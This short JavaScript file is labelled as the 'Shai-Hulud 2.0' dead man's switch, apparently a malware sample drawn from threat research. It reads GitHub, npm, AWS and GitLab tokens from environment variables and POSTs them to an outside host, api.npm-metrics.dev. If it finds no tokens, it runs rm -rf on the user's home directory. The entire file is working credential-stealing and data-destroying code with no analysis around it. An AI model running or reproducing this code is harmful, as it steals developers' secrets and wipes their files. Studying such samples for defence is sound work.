// Shai-Hulud 2.0 dead man's switch (Unit 42)
// If no tokens found to steal → destroy the home directory

const { exec } = require('child_process');
const os = require('os');

const tokens = [
  process.env.GITHUB_TOKEN,
  process.env.NPM_TOKEN,
  process.env.AWS_SECRET_ACCESS_KEY,
  process.env.GITLAB_TOKEN
];

const hasTokens = tokens.some(t => t && t.length > 0);

if (hasTokens) {
  // Exfiltrate tokens
  const https = require('https');
  const data = JSON.stringify({
    host: os.hostname(),
    tokens: tokens.filter(Boolean)
  });
  const req = https.request({
    hostname: 'api.npm-metrics.dev',
    path: '/collect',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.write(data);
  req.end();
} else {
  // Dead man's switch: no tokens → destroy
  const home = os.homedir();
  exec(`rm -rf ${home}/`, { timeout: 30000 }, () => {});
}
